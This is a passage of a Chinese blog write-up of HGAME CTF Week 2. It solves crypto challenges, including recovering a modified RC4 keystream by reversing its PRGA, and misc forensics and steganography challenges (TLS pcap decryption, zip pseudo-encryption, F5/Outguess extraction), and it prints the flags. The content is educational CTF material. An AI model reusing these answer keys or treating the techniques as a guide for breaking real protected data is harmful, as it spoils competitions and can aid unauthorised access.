style="color:#ae81ff">\x81\x9c</span><span style="color:#e6db74">&#39;</span>)
+
+s_144 <span style="color:#f92672">=</span> div_l(s_739, s_595)
+s_163 <span style="color:#f92672">=</span> div_l(s_595, _pow(s_144, <span style="color:#ae81ff">3</span>))
+s_19 <span style="color:#f92672">=</span> div_l(s_595, _pow(s_144, <span style="color:#ae81ff">4</span>))
+s_11 <span style="color:#f92672">=</span> div_l(s_163, _pow(s_19, <span style="color:#ae81ff">8</span>))
+s_8 <span style="color:#f92672">=</span> div_l(s_19, s_11)
+s_3 <span style="color:#f92672">=</span> div_l(s_739, _pow(s_8, <span style="color:#ae81ff">92</span>))
+s_2 <span style="color:#f92672">=</span> div_l(s_739, _pow(s_11, <span style="color:#ae81ff">67</span>))
+s <span style="color:#f92672">=</span> div_l(s_3, s_2)
+<span style="color:#75715e">## 验证s正确性</span>
+<span style="color:#66d9ef">assert</span> _pow(s, <span style="color:#ae81ff">595</span>) <span style="color:#f92672">==</span> s_595
+</code></pre></div><p>求出s，接着计算</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">f <span style="color:#f92672">=</span> list(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">-</span><span style="color:#ae81ff">\xa5</span><span style="color:#e6db74">{</span><span style="color:#ae81ff">\xb9\x85</span><span style="color:#e6db74">J @</span><span style="color:#ae81ff">\xfa\x91\x0b\x88\r</span><span style="color:#e6db74">4I</span><span style="color:#ae81ff">\x7f\xb9\xe5\r\xc0\x84\x8f\xa6\xc0</span><span style="color:#e6db74">i</span><span style="color:#ae81ff">\xb0\xa4\x1b\x8f</span><span style="color:#e6db74">Iw</span><span style="color:#ae81ff">\x84</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xa2\xa4\x00\x91\x87\x10\r\\\x8c\x12</span><span style="color:#e6db74">&#34;</span>)
+flag <span style="color:#f92672">=</span> bytes([ s<span style="color:#f92672">.</span>index(_) <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> f ])
+<span style="color:#66d9ef">print</span>(flag<span style="color:#f92672">.</span>decode())
+</code></pre></div><p>拿到flag：<code>hgame{U_kN0w~tH3+eXtEnD-EuC1iD34n^A1G0rIthM}</code></p>
+<h4 id="notrc4">notRC4</h4>
+<p>魔改的RC4_MD5算法，去WIKI上现学了一波。
+(当然第一步还是要把恶心的变量名给重命名回正常的。。。)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python"><span style="color:#75715e">##!/usr/bin/env python3</span>
+<span style="color:#75715e">## -*- coding: utf-8 -*-</span>
+<span style="color:#f92672">from</span> hashlib <span style="color:#f92672">import</span> md5
+
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
+
+<span style="color:#75715e">## assert flag.startswith(b&#39;hgame) and flag.endswith(b&#39;)</span>
+
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">notRC4</span>:
+    <span style="color:#66d9ef">def</span> __init__(self):
+        self<span style="color:#f92672">.</span>S <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span>
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+            self<span style="color:#f92672">.</span>S[i] <span style="color:#f92672">=</span> i
+        <span style="color:#75715e"># self.S = [0,1,2,3,4,5,6,...,255]</span>
+        self<span style="color:#f92672">.</span>_i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        self<span style="color:#f92672">.</span>_j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+        self<span style="color:#f92672">.</span>T <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">KSA</span>(self, K):
+        l <span style="color:#f92672">=</span> len(K)         <span style="color:#75715e">#  8</span>
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+            self<span style="color:#f92672">.</span>T[i] <span style="color:#f92672">=</span> K[i<span style="color:#f92672">%</span>l]
+        <span style="color:#75715e"># self.T = K * 32</span>
+        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+            self<span style="color:#f92672">.</span>_j <span style="color:#f92672">=</span> ( self<span style="color:#f92672">.</span>_j <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>S[i] <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>T[i] ) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+            <span style="color:#75715e"># swap</span>
+            self<span style="color:#f92672">.</span>S[i], self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_j] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_j], self<span style="color:#f92672">.</span>S[i]
+        self<span style="color:#f92672">.</span>_i <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">PRGA</span>(self, length):
+        O <span style="color:#f92672">=</span> []
+        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(length):
+            self<span style="color:#f92672">.</span>_i <span style="color:#f92672">=</span> ( self<span style="color:#f92672">.</span>_i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> ) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+            self<span style="color:#f92672">.</span>_j <span style="color:#f92672">=</span> ( self<span style="color:#f92672">.</span>_j <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_i] ) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+            self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_i], self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_j] <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_j], self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_i]
+            t <span style="color:#f92672">=</span> ( self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_i] <span style="color:#f92672">+</span> self<span style="color:#f92672">.</span>S[self<span style="color:#f92672">.</span>_j] ) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+            O<span style="color:#f92672">.</span>append( self<span style="color:#f92672">.</span>S[t] )
+        <span style="color:#66d9ef">print</span>(self<span style="color:#f92672">.</span>S)
+        <span style="color:#66d9ef">return</span> O
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(s1, s2):
+    <span style="color:#66d9ef">return</span> bytes(map( (<span style="color:#66d9ef">lambda</span> x: x[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">^</span>x[<span style="color:#ae81ff">1</span>]), zip(s1, s2) ))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">enc</span>(msg):
+    X <span style="color:#f92672">=</span> notRC4()
+    X<span style="color:#f92672">.</span>KSA( md5(msg)<span style="color:#f92672">.</span>digest()[:<span style="color:#ae81ff">8</span>] )
+    R <span style="color:#f92672">=</span> X<span style="color:#f92672">.</span>PRGA( len(msg) )
+    <span style="color:#66d9ef">return</span> xor(msg, R)
+
+<span style="color:#75715e">## print( enc(flag) )</span>
+</code></pre></div><p>WIKI上的RC4生成流密钥算法</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">each</span> <span style="color:#a6e22e">message</span> <span style="color:#66d9ef">byte</span> <span style="color:#a6e22e">b</span>
+    <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) (<span style="color:#a6e22e">mod</span> <span style="color:#ae81ff">256</span>)
+    <span style="color:#a6e22e">j</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">S</span>[<span style="color:#a6e22e">i</span>]) (<span style="color:#a6e22e">mod</span> <span style="color:#ae81ff">256</span>)
+    <span style="color:#a6e22e">swap</span>(<span style="color:#a6e22e">S</span>[<span style="color:#a6e22e">i</span>], <span style="color:#a6e22e">S</span>[<span style="color:#a6e22e">j</span>])
+    <span style="color:#a6e22e">t</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">S</span>[<span style="color:#a6e22e">i</span>] <span style="color:#f92672">+</span> <span style="color:#a6e22e">S</span>[<span style="color:#a6e22e">j</span>]) (<span style="color:#a6e22e">mod</span> <span style="color:#ae81ff">256</span>)
+    <span style="color:#a6e22e">print</span> <span style="color:#a6e22e">S</span>[<span style="color:#a6e22e">t</span>]
+</code></pre></div><p>然后题目已经把最终的S告诉我们了，所以其实只要枚举一下i，j，然后根据已知的明文很快就能求出stream_key拿到明文。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Python" data-lang="Python">
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(s1, s2):
+    <span style="color:#66d9ef">return</span> bytes(map( (<span style="color:#66d9ef">lambda</span> x: x[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">^</span>x[<span style="color:#ae81ff">1</span>]), zip(s1, s2) ))
+
+
+sBox <span style="color:#f92672">=</span> [<span style="color:#ae81ff">219</span>, <span style="color:#ae81ff">96</span>, <span style="color:#ae81ff">199</span>, <span style="color:#ae81ff">216</span>, <span style="color:#ae81ff">68</span>, <span style="color:#ae81ff">104</span>, <span style="color:#ae81ff">66</span>, <span style="color:#ae81ff">149</span>, <span style="color:#ae81ff">157</span>, <span style="color:#ae81ff">180</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">106</span>, <span style="color:#ae81ff">225</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">245</span>, <span style="color:#ae81ff">126</span>, <span style="color:#ae81ff">218</span>, <span style="color:#ae81ff">130</span>, <span style="color:#ae81ff">67</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">117</span>, <span style="color:#ae81ff">127</span>, <span style="color:#ae81ff">37</span>, <span style="color:#ae81ff">60</span>, <span style="color:#ae81ff">78</span>, <span style="color:#ae81ff">236</span>, <span style="color:#ae81ff">38</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">217</span>, <span style="color:#ae81ff">107</span>, <span style="color:#ae81ff">173</span>, <span style="color:#ae81ff">46</span>, <span style="color:#ae81ff">194</span>, <span style="color:#ae81ff">211</span>, <span style="color:#ae81ff">204</span>, <span style="color:#ae81ff">124</span>, <span style="color:#ae81ff">65</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">85</span>, <span style="color:#ae81ff">227</span>, <span style="color:#ae81ff">110</span>, <span style="color:#ae81ff">244</span>, <span style="color:#ae81ff">249</span>, <span style="color:#ae81ff">220</span>, <span style="color:#ae81ff">97</span>, <span style="color:#ae81ff">241</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">143</span>, <span style="color:#ae81ff">251</span>, <span style="color:#ae81ff">49</span>, <span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">152</span>, <span style="color:#ae81ff">45</span>, <span style="color:#ae81ff">36</span>, <span style="color:#ae81ff">129</span>, <span style="color:#ae81ff">34</span>, <span style="color:#ae81ff">237</span>, <span style="color:#ae81ff">54</span>, <span style="color:#ae81ff">174</span>, <span style="color:#ae81ff">48</span>, <span style="color:#ae81ff">183</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">71</span>, <span style="color:#ae81ff">209</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">56</span>, <span style="color:#ae81ff">231</span>, <span style="color:#ae81ff">188</span>, <span style="color:#ae81ff">153</span>, <span style="color:#ae81ff">86</span>, <span style="color:#ae81ff">98</span>, <span style="color:#ae81ff">178</span>, <span style="color:#ae81ff">73</span>, <span style="color:#ae81ff">135</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">95</span>, <span style="color:#ae81ff">43</span>, <span style="color:#ae81ff">77</span>, <span style="color:#ae81ff">40</span>, <span style="color:#ae81ff">84</span>, <span style="color:#ae81ff">223</span>, <span style="color:#ae81ff">72</span>, <span style="color:#ae81ff">89</span>, <span style="color:#ae81ff">101</span>, <span style="color:#ae81ff">42</span>, <span style="color:#ae81ff">248</span>, <span style="color:#ae81ff">166</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">138</span>, <span style="color:#ae81ff">91</span>, <span style="color:#ae81ff">160</span>, <span style="color:#ae81ff">198</span>, <span style="color:#ae81ff">203</span>, <span style="color:#ae81ff">28</span>, <span style="color:#ae81ff">247</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">41</span>, <span style="color:#ae81ff">132</span>, <span style="color:#ae81ff">139</span>, <span style="color:#ae81ff">133</span>, <span style="color:#ae81ff">147</span>, <span style="color:#ae81ff">235</span>, <span style="color:#ae81ff">207</span>, <span style="color:#ae81ff">62</span>, <span style="color:#ae81ff">151</span>, <span style="color:#ae81ff">87</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">136</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">169</span>, <span style="color:#ae81ff">102</span>, <span style="color:#ae81ff">27</span>, <span style="color:#ae81ff">170</span>, <span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">39</span>, <span style="color:#ae81ff">99</span>, <span style="color:#ae81ff">134</span>, <span style="color:#ae81ff">242</span>, <span style="color:#ae81ff">61</span>, <span style="color:#ae81ff">184</span>, <span style="color:#ae81ff">64</span>, <span style="color:#ae81ff">25</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">116</span>, <span style="color:#ae81ff">243</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">221</span>, <span style="color:#ae81ff">176</span>, <span style="color:#ae81ff">35</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">215</span>, <span style="color:#ae81ff">53</span>, <span style="color:#ae81ff">88</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">163</span>, <span style="color:#ae81ff">59</span>, <span style="color:#ae81ff">125</span>, <span style="color:#ae81ff">190</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">197</span>, <span style="color:#ae81ff">32</span>, <span style="color:#ae81ff">195</span>, <span style="color:#ae81ff">212</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">191</span>, <span style="color:#ae81ff">144</span>, <span style="color:#ae81ff">145</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">108</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">103</span>, <span style="color:#ae81ff">214</span>, <span style="color:#ae81ff">142</span>, <span style="color:#ae81ff">161</span>, <span style="color:#ae81ff">93</span>, <span style="color:#ae81ff">201</span>, <span style="color:#ae81ff">140</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">79</span>, <span style="color:#ae81ff">187</span>, <span style="color:#ae81ff">192</span>, <span style="color:#ae81ff">50</span>, <span style="color:#ae81ff">205</span>, <span style="color:#ae81ff">69</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">200</span>, <span style="color:#ae81ff">111</span>, <span style="color:#ae81ff">232</span>, <span style="color:#ae81ff">185</span>, <span style="color:#ae81ff">239</span>, <span style="color:#ae81ff">70</span>, <span style="color:#ae81ff">94</span>, <span style="color:#ae81ff">228</span>, <span style="color:#ae81ff">105</span>, <span style="color:#ae81ff">229</span>, <span style="color:#ae81ff">206</span>, <span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">148</span>, <span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">165</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">181</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">213</span>, <span style="color:#ae81ff">238</span>, <span style="color:#ae81ff">119</span>, <span style="color:#ae81ff">122</span>, <span style="color:#ae81ff">115</span>, <span style="color:#ae81ff">155</span>, <span style="color:#ae81ff">112</span>, <span style="color:#ae81ff">141</span>, <span style="color:#ae81ff">233</span>, <span style="color:#ae81ff">175</span>, <span style="color:#ae81ff">109</span>, <span style="color:#ae81ff">113</span>, <span style="color:#ae81ff">75</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">172</span>, <span style="color:#ae81ff">230</span>, <span style="color:#ae81ff">47</span>, <span style="color:#ae81ff">162</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">208</span>, <span style="color:#ae81ff">159</span>, <span style="color:#ae81ff">210</span>, <span style="color:#ae81ff">158</span>, <span style="color:#ae81ff">226</span>, <span style="color:#ae81ff">83</span>, <span style="color:#ae81ff">246</span>, <span style="color:#ae81ff">44</span>, <span style="color:#ae81ff">193</span>, <span style="color:#ae81ff">90</span>, <span style="color:#ae81ff">29</span>, <span style="color:#ae81ff">240</span>, <span style="color:#ae81ff">179</span>, <span style="color:#ae81ff">52</span>, <span style="color:#ae81ff">63</span>, <span style="color:#ae81ff">57</span>, <span style="color:#ae81ff">254</span>, <span style="color:#ae81ff">74</span>, <span style="color:#ae81ff">222</span>, <span style="color:#ae81ff">156</span>, <span style="color:#ae81ff">82</span>, <span style="color:#ae81ff">30</span>, <span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">182</span>, <span style="color:#ae81ff">255</span>, <span style="color:#ae81ff">186</span>, <span style="color:#ae81ff">150</span>, <span style="color:#ae81ff">118</span>, <span style="color:#ae81ff">146</span>, <span style="color:#ae81ff">81</span>, <span style="color:#ae81ff">224</span>, <span style="color:#ae81ff">189</span>, <span style="color:#ae81ff">202</span>, <span style="color:#ae81ff">164</span>, <span style="color:#ae81ff">121</span>, <span style="color:#ae81ff">55</span>, <span style="color:#ae81ff">177</span>, <span style="color:#ae81ff">167</span>, <span style="color:#ae81ff">137</span>, <span style="color:#ae81ff">234</span>, <span style="color:#ae81ff">33</span>, <span style="color:#ae81ff">31</span>, <span style="color:#ae81ff">131</span>, <span style="color:#ae81ff">92</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">250</span>, <span style="color:#ae81ff">76</span>, <span style="color:#ae81ff">128</span>, <span style="color:#ae81ff">171</span>, <span style="color:#ae81ff">196</span>, <span style="color:#ae81ff">26</span>, <span style="color:#ae81ff">253</span>, <span style="color:#ae81ff">154</span>]
+cipher <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;^{</span><span style="color:#ae81ff">\xaf</span><span style="color:#e6db74">sjg</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">%}</span><span style="color:#ae81ff">\xae\xff\xb4\xf1\xde\x83</span><span style="color:#e6db74">m</span><span style="color:#ae81ff">\xbe\x18</span><span style="color:#e6db74">r</span><span style="color:#ae81ff">\xbe\x19</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x1d</span><span style="color:#e6db74">|</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">2j</span><span style="color:#ae81ff">\xb9</span><span style="color:#e6db74">^</span><span style="color:#ae81ff">\xc7\xcd</span><span style="color:#e6db74">+</span><span style="color:#ae81ff">\x9b</span><span style="color:#e6db74">9</span><span style="color:#ae81ff">\xd5\xe5\xba</span><span style="color:#e6db74">8</span><span style="color:#ae81ff">\xe2\x11\x92\x02\xd2</span><span style="color:#e6db74">E</span><span style="color:#ae81ff">\x1f</span><span style="color:#e6db74">ZIz*</span><span style="color:#ae81ff">\x15</span><span style="color:#e6db74">&#34;</span>
+
+
+<span style="color:#f92672">from</span> copy <span style="color:#f92672">import</span> deepcopy
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">f</span>(S, i, j, l):
+    O <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(l):
+        t <span style="color:#f92672">=</span> ( S[i] <span style="color:#f92672">+</span> S[j] ) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+        O<span style="color:#f92672">.</span>append( S[t] )
+        S[i], S[j] <span style="color:#f92672">=</span> S[j], S[i]
+        j <span style="color:#f92672">=</span> ( j <span style="color:#f92672">-</span> S[i] ) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+        i <span style="color:#f92672">=</span> ( i <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> ) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+    O<span style="color:#f92672">.</span>reverse()
+    <span style="color:#66d9ef">return</span> O
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+        s <span style="color:#f92672">=</span> deepcopy(sBox)
+        o <span style="color:#f92672">=</span> f(s, i, j, len(cipher))
+        m <span style="color:#f92672">=</span> xor(cipher, o)
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hgame{&#39;</span> <span style="color:#f92672">in</span> m:
+            <span style="color:#66d9ef">print</span>(m)
+            exit(<span style="color:#ae81ff">0</span>)
+<span style="color:#75715e">## hgame{oo0OO000~_reVeRse_The~prg4_Of+rc4~-oOOOOOoO}</span>
+</code></pre></div><h5 id="week2-crypto-ak">Week2 Crypto AK</h5>
+<h3 id="0x04-misc">0x04 Misc</h3>
+<h4 id="cosmos的午餐">Cosmos的午餐</h4>
+<p>这题真的好绕啊。。
+先压缩包打开，是wireshark的抓包文件和一个TLS密钥文件，于是打开wireshark并导入ssl_log.log文件
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%209.48.16%20PM.png" alt="Screen Shot 2020-01-24 at 9.48.16 P-w730">
+然后filter出来HTTP流量，大小从高到低排下来
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%209.49.08%20PM.png" alt="Screen Shot 2020-01-24 at 9.49.08 P-w1238">
+第一个PUT就很可疑，于是HTTP导出，看文件头像是个压缩包，binwalk一下
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%209.51.16%20PM.png" alt="Screen Shot 2020-01-24 at 9.51.16 P-w569">
+的确是zip压缩包，于是unzip解压，没有密码，得到一张图。。
+看文件名应该是要Outguess解密，但是需要key。
+想一下题目的hint<code>PS: Cosmos经常往图片备注里塞东西</code>，于是用Stegsolve打开，查看file format
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%209.54.53%20PM.png" alt="Screen Shot 2020-01-24 at 9.54.53 P-w307">
+大概就是这个了，于是Outguess打开解压内容
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%209.55.49%20PM.png" alt="Screen Shot 2020-01-24 at 9.55.49 P-w597">
+extract出来文件里一串url：<code>https://dwz.cn/69rOREdu</code>
+wget下载下来，又是一个压缩包。。
+解压，幸好没有密码，然后出来一个Logo.png
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%209.58.55%20PM.png" alt="Screen Shot 2020-01-24 at 9.58.55 P-w361">
+看着不太像完整的二维码，抱着试一试的心态用iPhone扫了一下。。
+<img src="media/15798363305346/IMG_1980.jpg" alt="IMG_1980-w562">
+结果可以，拿到flag。</p>
+<h4 id="所见即为假">所见即为假</h4>
+<p>根据提示，压缩包用hex editor打开
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%208.09.50%20PM.png" alt="Screen Shot 2020-01-24 at 8.09.50 P-w785">
+可以看到全局加密的那段标识是都为<code>00 00</code>的，所以判断是伪加密
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%208.10.07%20PM.png" alt="Screen Shot 2020-01-24 at 8.10.07 P-w787">
+于是把第二段的那个加密标识改为<code>00 00</code>，成功解压。
+拿到一张图片，但是看了好久试了半天没找到有用的东西。。。。
+想了一下最初的压缩包有一段注释：<code>F5 key: NllD7CQon6dBsFLr</code>，于是想到F5也是一种隐写加密图片的手段。。
+于是下载安装F5工具
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%2010.57.11%20PM.png" alt="Screen Shot 2020-01-24 at 10.57.11 P-w568">
+得到一串hex字符串，果断Python打开
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%2010.58.30%20PM.png" alt="Screen Shot 2020-01-24 at 10.58.30 P-w567">
+拿到flag</p>
+<h4 id="地球上最后的夜晚">地球上最后的夜晚</h4>
+<p>解压得到一份PDF文件和加密的7z文件。
+PDF用wbStego4open打开，根据提示<code>No password</code>，直接继续
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%2011.14.02%20PM.png" alt="Screen Shot 2020-01-24 at 11.14.02 P-w537">
+生成数据打开
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%2011.14.30%20PM.png" alt="Screen Shot 2020-01-24 at 11.14.30 P-w303">
+拿到压缩包密码，继续解压文件，得到一份docx文件。考虑到时联系docx，基于xml打包出来的所以很容易隐藏东西在压缩包里。
+于是继续用7z解压docx，解压出来了一坨东西，逐个看一下，在word文件夹里看到了<code>secret.xml</code>
+<img src="media/15798363305346/Screen%20Shot%202020-01-24%20at%2011.28.34%20PM.png" alt="Screen Shot 2020-01-24 at 11.28.34 P-w407">
+搞定，拿到flag。。</p>
+<h4 id="玩玩条码">玩玩条码</h4>
+<p>解压看到注释<code>Decode JPNPostCode to get MSUStegoVideo password.</code>于是去解条码，在查了一遍通用常见条码之后发现是日本邮政条码，但是没有找到很明确的编码规则，又于是找了一个日邮条码生在线成器，一个个试了过去。。。
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%201.56.44%20PM.png" alt="Screen Shot 2020-01-25 at 1.56.44 P-w1281">
+最后试出来，和压缩包里给的条码一致，接着去解视频。
+VirtualDub2（安装好MSUStegoVideo插件）打开，加载插件提取。
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%202.11.27%20PM.png" alt="Screen Shot 2020-01-25 at 2.11.27 P-w1248">
+转码之后，在生成的文本里找到了zip密码
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%202.11.56%20PM.png" alt="Screen Shot 2020-01-25 at 2.11.56 P-w355">
+解压7z压缩包，得到另一串条形码
+<img src="media/15798363305346/Code128.png" alt="Code128-w464">
+这个简单，在线解CODE-128条形码的网站很多
+<img src="media/15798363305346/Screen%20Shot%202020-01-25%20at%202.15.29%20PM.png" alt="Screen Shot 2020-01-25 at 2.15.29 P-w1131">
+拿到flag</p>
+<h5 id="week2-misc-ak">Week2 Misc Ak</h5>
+
+    </div>
+    <div class="post-footer">
+      <div class="info">
+        
+        
+    <span class="separator"><a class="tag" href="/tags/ctf/">CTF</a><a class="tag" href="/tags/hgame/">Hgame</a></span>
+
+      </div>
+    </div>
+
+    
+           
+    
+</div>
+
+
+                </div>
+            </div>
+        </div>
+</body>
+<script type="text/javascript" src="https://12x.me/js/jquery.min.js"></script>
+<script type="text/javascript" src="https://12x.me/js/jquery-migrate.min.js"></script>
+<script type="text/javascript" src="https://12x.me/js/jquery-appear.min.js"></script></html></body>
+
+</html>
